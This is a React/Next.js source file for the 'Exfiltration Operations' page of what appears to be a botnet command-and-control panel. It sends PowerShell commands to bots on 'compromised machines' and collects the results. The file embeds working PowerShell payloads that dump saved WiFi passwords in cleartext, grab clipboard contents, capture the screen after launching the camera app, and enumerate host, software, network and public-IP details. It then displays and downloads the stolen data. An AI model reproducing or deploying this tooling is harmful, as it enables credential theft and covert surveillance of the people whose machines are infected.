'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import PageLayout from '../components/PageLayout';
import LoadingScreen from '../components/LoadingScreen';
import { User, parseUserFromCookie, removeCookie } from '../utils/auth';

interface Bot {
  _id: string;
  uuid: string;
  username: string;
  platform: string;
  github_username: string;
  github_repo: string;
  commands_file: string;
  results_file: string;
  created_at: string;
  status: string;
  last_seen?: string;
  capabilities?: string[];
  transport_channel: string;
}

export default function ExfilPage() {
  const [user, setUser] = useState<User | null>(null);
  const [loading, setLoading] = useState(true);
  const [bots, setBots] = useState<Bot[]>([]);
  const [loadingBots, setLoadingBots] = useState(false);
  const [selectedBot, setSelectedBot] = useState<string>('');
  const [showResults, setShowResults] = useState(false);
  const [selectedResult, setSelectedResult] = useState<any>(null);
  const [isExecuting, setIsExecuting] = useState(false);
  const [isPolling, setIsPolling] = useState(false);
  const [currentCommand, setCurrentCommand] = useState<string>('');
  const router = useRouter();

  useEffect(() => {
    // Check if user is logged in via cookies
    const userInfo = parseUserFromCookie();
    if (!userInfo) {
      router.push('/');
      return;
    }

    setUser(userInfo);
    setLoading(false);
    loadBots();
  }, [router]);

  const loadBots = async () => {
    try {
      setLoadingBots(true);
      const response = await fetch(`http://localhost:5000/bots?username=${user?.username || 'admin'}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        },
      });

      if (response.ok) {
        const result = await response.json();
        if (result.status === 'success') {
          setBots(result.bots);
          if (result.bots.length > 0) {
            setSelectedBot(result.bots[0].uuid);
          }
        }
      }
    } catch (error) {
      console.error('Error loading bots:', error);
    } finally {
      setLoadingBots(false);
    }
  };

  const pollForResults = async (commandName: string, maxAttempts: number = 20) => {
    if (!selectedBot) return;
    
    setIsPolling(true);
    let attempts = 0;
    
    const pollInterval = setInterval(async () => {
      attempts++;
      console.log(`Polling attempt ${attempts}/${maxAttempts} for ${commandName}...`);
      
      try {
        const response = await fetch(`http://localhost:5000/get-results?bot_uuid=${selectedBot}&username=${user?.username || 'admin'}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
          },
        });

        if (response.ok) {
          const result = await response.json();
          if (result.status === 'success' && result.results && result.results.trim() !== '') {
            console.log(`Results found for ${commandName}!`);
            
            // Check if the result contains base64 image data
            const isBase64Image = result.results.includes('data:image') || 
                                  (result.results.length > 1000 && /^[A-Za-z0-9+/=]+$/.test(result.results.trim()));
            
            setSelectedResult({
              data: result.results,
              is_base64: isBase64Image,
              bot_uuid: selectedBot,
              command_name: commandName
            });
            setShowResults(true);
            clearInterval(pollInterval);
            setIsPolling(false);
            return;
          }
        }
        
        if (attempts >= maxAttempts) {
          console.log(`Max polling attempts reached for ${commandName}`);
          clearInterval(pollInterval);
          setIsPolling(false);
          alert(`No results found for ${commandName} after ${maxAttempts} attempts. The bot may not be responding.`);
        }
      } catch (error) {
        console.error(`Error polling for ${commandName}:`, error);
        if (attempts >= maxAttempts) {
          clearInterval(pollInterval);
          setIsPolling(false);
        }
      }
    }, 2000); // Poll every 2 seconds
  };

  const handleLogout = () => {
    removeCookie('user');
    router.push('/');
  };

  const executeCommand = async (commandName: string, command: string) => {
    if (!selectedBot) {
      alert('Please select a bot first');
      return;
    }
    
    setIsExecuting(true);
    
    try {
      console.log(`Executing ${commandName}...`);
      console.log('Selected bot:', selectedBot);
      console.log('User:', user);
      console.log('Command:', command);
      
      const requestBody = {
        bot_uuid: selectedBot,
        command: command,
        username: user?.username || 'admin'
      };
      
      console.log('Request body:', requestBody);
      
      const response = await fetch('http://localhost:5000/execute-command', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(requestBody),
      });

      console.log('Response status:', response.status);
      console.log('Response ok:', response.ok);
      
      if (response.ok) {
        const result = await response.json();
        console.log('Response data:', result);
        console.log(`${commandName} command sent successfully`);
        setCurrentCommand(commandName);
        alert(`${commandName} command sent! Automatically polling for results...`);
        
        // Start polling for results automatically
        setTimeout(() => {
          pollForResults(commandName);
        }, 3000); // Wait 3 seconds before starting to poll
      } else {
        const errorText = await response.text();
        console.error(`Failed to send ${commandName} command. Status: ${response.status}, Error: ${errorText}`);
        alert(`Failed to send ${commandName} command. Status: ${response.status}`);
      }
      
    } catch (error) {
      console.error(`Error executing ${commandName}:`, error);
      alert(`Error executing ${commandName}: ${error.message}`);
    } finally {
      setIsExecuting(false);
    }
  };

  const handleWiFiPasswords = () => {
    const wifiCommand = '(netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object { $n = $_.ToString().Split(":")[1].Trim(); $pw = (netsh wlan show profile name="$n" key=clear) | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }; "$n : $($pw -join \',\')" }';
    executeCommand('WiFi Passwords', wifiCommand);
  };

  const handleClipboard = () => {
    const clipboardCommand = 'Get-Clipboard';
    executeCommand('Clipboard Content', clipboardCommand);
  };

  const handleCamera = () => {
    const cameraCommand = 'Add-Type -AssemblyName System.Drawing; Add-Type -AssemblyName System.Windows.Forms; Start-Process "microsoft.windows.camera:"; Start-Sleep 5; $b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bm=New-Object System.Drawing.Bitmap $b.Width,$b.Height; $g=[System.Drawing.Graphics]::FromImage($bm); $g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size); $f="$env:TEMP\\camera_screenshot.jpg"; $bm.Save($f,[System.Drawing.Imaging.ImageFormat]::Jpeg); $bm.Dispose(); $g.Dispose(); Start-Sleep 2; Get-Process | Where-Object { $_.Name -like "*WindowsCamera*" } | ForEach-Object { try { Stop-Process -Id $_.Id -Force } catch {} }; [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($f)) | Write-Output';
    executeCommand('Camera Screenshot', cameraCommand);
  };

  const handleSystemInfo = () => {
    const systemCommand = 'Write-Host "===== SYSTEM INFO ====="; ([PSCustomObject]@{Host=$env:COMPUTERNAME;User=$env:USERNAME;OS=(Get-CimInstance Win32_OperatingSystem).Caption;Version=(Get-CimInstance Win32_OperatingSystem).Version}) | Format-Table -AutoSize; Write-Host "===== INSTALLED SOFTWARE ====="; Get-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* -ErrorAction SilentlyContinue | Select-Object DisplayName, DisplayVersion | Format-Table -AutoSize; Write-Host "===== PROCESSES ====="; Get-Process | Select Name, Id | Format-Table -AutoSize; Write-Host "===== SERVICES ====="; Get-Service | Select Name, Status | Format-Table -AutoSize; Write-Host "===== NETWORK ====="; Get-NetAdapter | Where Status -eq \'Up\' | Select Name, MacAddress | Format-Table -AutoSize; Get-NetIPAddress | Where AddressFamily -eq \'IPv4\' | Select IPAddress, InterfaceAlias | Format-Table -AutoSize; Write-Host "===== WIFI PROFILES ====="; (netsh wlan show profiles | Select-String \'All User Profile\' | ForEach-Object {($_.ToString().Split(\':\')[1]).Trim()}) | Format-Table @{Expression={$_};Label="ProfileName"} -AutoSize; Write-Host "===== PUBLIC IP ====="; try { (Invoke-RestMethod \'https://api.ipify.org?format=json\').ip } catch { \'Unable to retrieve\' }';
    executeCommand('System Information', systemCommand);
  };

  const handleViewResults = async (commandName: string) => {
    if (!selectedBot) {
      alert('Please select a bot first');
      return;
    }
    
    try {
      const response = await fetch(`http://localhost:5000/get-results?bot_uuid=${selectedBot}&username=${user?.username || 'admin'}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        },
      });

      if (response.ok) {
        const result = await response.json();
        if (result.status === 'success' && result.results) {
          // Check if the result contains base64 image data
          const isBase64Image = result.results.includes('data:image') || 
                                (result.results.length > 1000 && /^[A-Za-z0-9+/=]+$/.test(result.results.trim()));
          
          setSelectedResult({
            data: result.results,
            is_base64: isBase64Image,
            bot_uuid: selectedBot,
            command_name: commandName
          });
          setShowResults(true);
        } else {
          alert(`No results available yet for ${commandName}. The bot may still be processing the command.`);
        }
      } else {
        alert(`Failed to get results for ${commandName}`);
      }
    } catch (error) {
      console.error(`Error getting results for ${commandName}:`, error);
      alert(`Error getting results for ${commandName}`);
    }
  };

  if (loading) {
    return <LoadingScreen />;
  }

  if (!user) {
    return null;
  }

  return (
    <PageLayout user={user} currentPage="exfil" onLogout={handleLogout}>
      <main className="p-6 space-y-6">
        {/* Header */}
        <div>
          <h1 className="text-3xl font-mono font-bold text-green-400 mb-2">Exfiltration Operations</h1>
          <p className="text-gray-400 font-mono">
            Execute comprehensive data exfiltration on compromised machines
          </p>
        </div>

        {/* Bot Selection */}
        <div className="bg-gray-900 rounded-lg border border-gray-700 p-6">
          <h2 className="text-xl font-mono font-bold text-green-400 mb-4">Select Target Bot</h2>
          
          {loadingBots ? (
            <div className="text-center py-8">
              <div className="text-gray-400 font-mono">Loading bots...</div>
            </div>
          ) : bots.length === 0 ? (
            <div className="text-center py-8">
              <div className="text-gray-400 font-mono mb-2">No bots available</div>
              <div className="text-gray-500 font-mono text-sm">Create a bot first to perform exfiltration operations</div>
            </div>
          ) : (
            <div className="space-y-4">
              <select
                value={selectedBot}
                onChange={(e) => setSelectedBot(e.target.value)}
                className="bg-gray-800 border border-gray-600 rounded-lg px-4 py-2 text-white font-mono w-full focus:outline-none focus:ring-2 focus:ring-green-500"
              >
                {bots.map((bot) => (
                  <option key={bot.uuid} value={bot.uuid}>
                    {bot.uuid.substring(0, 8)}... - {bot.platform} - {bot.status}
                  </option>
                ))}
              </select>
              
              {selectedBot && (
                <div className="bg-gray-800 rounded-lg p-4 border border-gray-600">
                  <div className="text-green-400 font-mono font-semibold mb-2">Selected Bot:</div>
                  <div className="text-gray-300 font-mono text-sm space-y-1">
                    <div>UUID: {selectedBot}</div>
                    <div>Platform: {bots.find(b => b.uuid === selectedBot)?.platform}</div>
                    <div>Status: {bots.find(b => b.uuid === selectedBot)?.status}</div>
                  </div>
                </div>
              )}
            </div>
          )}
        </div>

        {/* Exfiltration Controls */}
        <div className="bg-gray-900 rounded-lg border border-gray-700 p-6">
          <h2 className="text-xl font-mono font-bold text-green-400 mb-4">Exfiltration Controls</h2>
          
          <div className="space-y-4">
            <div className="bg-gray-800 rounded-lg p-4 border border-gray-600">
              <h3 className="text-lg font-mono font-semibold text-yellow-400 mb-2">Comprehensive Data Exfiltration</h3>
              <p className="text-gray-400 font-mono text-sm mb-4">
                This will execute the following commands on the selected bot:
              </p>
              <ul className="text-gray-300 font-mono text-sm space-y-1 ml-4">
                <li>• WiFi Passwords - Extract saved WiFi credentials</li>
                <li>• Clipboard Content - Get current clipboard data</li>
                <li>• Camera Screenshot - Capture screen and camera</li>
                <li>• System Information - Get detailed system info</li>
              </ul>
            </div>
            
            <div className="space-y-6">
              {/* WiFi Passwords Section */}
              <div className="bg-gray-800 rounded-lg p-4 border border-gray-600">
                <div className="flex items-center justify-between mb-3">
                  <h3 className="text-lg font-mono font-semibold text-green-400">📶 WiFi Passwords</h3>
                  <div className="flex space-x-2">
                    <button
                      onClick={handleWiFiPasswords}
                      disabled={!selectedBot || isExecuting || isPolling}
                      className="bg-green-600 hover:bg-green-700 disabled:bg-gray-600 disabled:cursor-not-allowed text-white px-4 py-2 rounded font-mono text-sm transition-colors"
                    >
                      {isExecuting ? 'EXECUTING...' : isPolling ? 'POLLING...' : 'EXECUTE'}
                    </button>
                    {isPolling && currentCommand === 'WiFi Passwords' && (
                      <div className="text-yellow-400 font-mono text-sm flex items-center">
                        🔄 Auto-polling for results...
                      </div>
                    )}
                  </div>
                </div>
                <p className="text-gray-400 font-mono text-sm">Extract saved WiFi credentials from the target machine</p>
              </div>

              {/* Clipboard Section */}
              <div className="bg-gray-800 rounded-lg p-4 border border-gray-600">
                <div className="flex items-center justify-between mb-3">
                  <h3 className="text-lg font-mono font-semibold text-blue-400">📋 Clipboard Content</h3>
                  <div className="flex space-x-2">
                    <button
                      onClick={handleClipboard}
                      disabled={!selectedBot || isExecuting || isPolling}
                      className="bg-blue-600 hover:bg-blue-700 disabled:bg-gray-600 disabled:cursor-not-allowed text-white px-4 py-2 rounded font-mono text-sm transition-colors"
                    >
                      {isExecuting ? 'EXECUTING...' : isPolling ? 'POLLING...' : 'EXECUTE'}
                    </button>
                    {isPolling && currentCommand === 'Clipboard Content' && (
                      <div className="text-yellow-400 font-mono text-sm flex items-center">
                        🔄 Auto-polling for results...
                      </div>
                    )}
                  </div>
                </div>
                <p className="text-gray-400 font-mono text-sm">Get current clipboard data from the target machine</p>
              </div>

              {/* Camera Screenshot Section */}
              <div className="bg-gray-800 rounded-lg p-4 border border-gray-600">
                <div className="flex items-center justify-between mb-3">
                  <h3 className="text-lg font-mono font-semibold text-purple-400">📸 Camera Screenshot</h3>
                  <div className="flex space-x-2">
                    <button
                      onClick={handleCamera}
                      disabled={!selectedBot || isExecuting || isPolling}
                      className="bg-purple-600 hover:bg-purple-700 disabled:bg-gray-600 disabled:cursor-not-allowed text-white px-4 py-2 rounded font-mono text-sm transition-colors"
                    >
                      {isExecuting ? 'EXECUTING...' : isPolling ? 'POLLING...' : 'EXECUTE'}
                    </button>
                    {isPolling && currentCommand === 'Camera Screenshot' && (
                      <div className="text-yellow-400 font-mono text-sm flex items-center">
                        🔄 Auto-polling for results...
                      </div>
                    )}
                  </div>
                </div>
                <p className="text-gray-400 font-mono text-sm">Capture screen and camera, returns base64 image data</p>
              </div>

              {/* System Information Section */}
              <div className="bg-gray-800 rounded-lg p-4 border border-gray-600">
                <div className="flex items-center justify-between mb-3">
                  <h3 className="text-lg font-mono font-semibold text-orange-400">💻 System Information</h3>
                  <div className="flex space-x-2">
                    <button
                      onClick={handleSystemInfo}
                      disabled={!selectedBot || isExecuting || isPolling}
                      className="bg-orange-600 hover:bg-orange-700 disabled:bg-gray-600 disabled:cursor-not-allowed text-white px-4 py-2 rounded font-mono text-sm transition-colors"
                    >
                      {isExecuting ? 'EXECUTING...' : isPolling ? 'POLLING...' : 'EXECUTE'}
                    </button>
                    {isPolling && currentCommand === 'System Information' && (
                      <div className="text-yellow-400 font-mono text-sm flex items-center">
                        🔄 Auto-polling for results...
                      </div>
                    )}
                  </div>
                </div>
                <p className="text-gray-400 font-mono text-sm">Get detailed system information, processes, services, and network data</p>
              </div>
              
              <div className="text-gray-400 font-mono text-sm text-center">
                <strong>Auto-Polling Command Execution:</strong><br/>
                Click "EXECUTE" to run a command - results will appear automatically!<br/>
                The system polls for results every 2 seconds for up to 40 seconds<br/>
                Each command runs independently and shows its own results
              </div>
            </div>
          </div>
        </div>

        {/* Results Modal */}
        {showResults && selectedResult && (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
            <div className="bg-gray-900 rounded-lg border border-gray-700 max-w-4xl max-h-[80vh] w-full mx-4 overflow-hidden">
              <div className="p-6 border-b border-gray-700">
                <div className="flex items-center justify-between">
                  <h3 className="text-xl font-mono font-bold text-green-400">
                    {selectedResult.command_name || 'Exfiltration'} Results
                  </h3>
                  <button
                    onClick={() => setShowResults(false)}
                    className="text-gray-400 hover:text-white text-2xl font-bold"
                  >
                    ×
                  </button>
                </div>
              </div>
              
              <div className="p-6 overflow-auto max-h-[60vh]">
                <div className="bg-gray-800 rounded-lg p-4">
                  <div className="mb-4">
                    <h4 className="text-green-400 font-mono font-bold mb-2">Comprehensive Exfiltration Results</h4>
                    <p className="text-gray-400 font-mono text-sm">
                      This contains: WiFi Passwords, Clipboard Content, System Information, and Camera Screenshot
                    </p>
                  </div>
                  
                  {selectedResult.is_base64 ? (
                    <div className="mb-4">
                      <h5 className="text-yellow-400 font-mono font-bold mb-2">📸 Screenshot Captured:</h5>
                      <div className="text-center">
                        <img 
                          src={`data:image/jpeg;base64,${selectedResult.data}`} 
                          alt="Screenshot"
                          className="max-w-full h-auto mx-auto rounded border border-gray-600"
                          style={{ maxHeight: '300px' }}
                        />
                        <div className="mt-2">
                          <button
                            onClick={() => {
                              const link = document.createElement('a');
                              link.href = `data:image/jpeg;base64,${selectedResult.data}`;
                              link.download = `screenshot_${Date.now()}.jpg`;
                              link.click();
                            }}
                            className="bg-green-600 hover:bg-green-700 text-white px-3 py-1 rounded text-sm font-mono"
                          >
                            Download Screenshot
                          </button>
                        </div>
                      </div>
                    </div>
                  ) : (
                    <div className="bg-black rounded p-4 mb-4">
                      <pre className="text-green-300 font-mono text-xs whitespace-pre-wrap overflow-auto max-h-96">
                        {selectedResult.data || 'No data available'}
                      </pre>
                    </div>
                  )}
                  
                  <div className="flex space-x-2">
                    <button
                      onClick={() => {
                        const blob = new Blob([selectedResult.data || ''], { type: 'text/plain' });
                        const url = URL.createObjectURL(blob);
                        const link = document.createElement('a');
                        link.href = url;
                        link.download = `comprehensive_exfil_${Date.now()}.txt`;
                        link.click();
                        URL.revokeObjectURL(url);
                      }}
                      className="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded font-mono text-sm"
                    >
                      Download Complete Data
                    </button>
                    
                    <button
                      onClick={() => {
                        navigator.clipboard.writeText(selectedResult.data || '');
                        alert('Data copied to clipboard!');
                      }}
                      className="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded font-mono text-sm"
                    >
                      Copy to Clipboard
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}
      </main>
    </PageLayout>
  );
}